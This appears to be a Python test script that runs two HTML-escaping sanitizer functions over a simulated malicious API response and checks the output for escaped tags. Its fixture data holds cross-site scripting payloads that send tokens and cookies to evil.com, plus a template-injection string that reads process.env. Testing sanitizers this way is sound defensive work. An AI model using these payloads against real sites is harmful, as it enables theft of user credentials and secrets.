#!/usr/bin/env python3

import html
import json

def _sanitize_external_api_data(data):
    if data is None:
        return ''
    if isinstance(data, str):
        return html.escape(data)
    if isinstance(data, (int, float, bool)):
        return html.escape(str(data))
    if isinstance(data, dict):
        return {key: _sanitize_external_api_data(value) for key, value in data.items()}
    if isinstance(data, list):
        return [_sanitize_external_api_data(item) for item in data]
    return html.escape(str(data))

def _deep_html_escape_json_data(data):
    if isinstance(data, str):
        return html.escape(data)
    if isinstance(data, list):
        return [_deep_html_escape_json_data(item) for item in data]
    if isinstance(data, dict):
        return {key: _deep_html_escape_json_data(value) for key, value in data.items()}
    return data

# Test the actual test case data
malicious_api_response = {
    'dag_run_id': '<script>document.location="http://evil.com/steal?data="+localStorage.getItem("tokens")</script>',
    'status': '<img src=x onerror="fetch(\'http://evil.com\', {method:\'POST\', body:JSON.stringify(document.cookie)})">', 
    'message': '{{constructor.constructor("return process.env")()}}'
}

print("Original API response:")
print(json.dumps(malicious_api_response, indent=2))

sanitized_response = _sanitize_external_api_data(malicious_api_response)
print("\nAfter _sanitize_external_api_data:")
print(json.dumps(sanitized_response, indent=2))

final_safe_response = _deep_html_escape_json_data(sanitized_response)
print("\nAfter _deep_html_escape_json_data:")
print(json.dumps(final_safe_response, indent=2))

final_json = json.dumps(final_safe_response)

print("\nChecking for patterns:")
patterns_to_check = [
    '&lt;script&gt;',
    '&lt;img',
    '&amp;lt;script&amp;gt;',
    '&amp;lt;img',
    '<script>',
    '<img'
]

for pattern in patterns_to_check:
    found = pattern in final_json
    print(f"  '{pattern}': {'✅ FOUND' if found else '❌ NOT FOUND'}")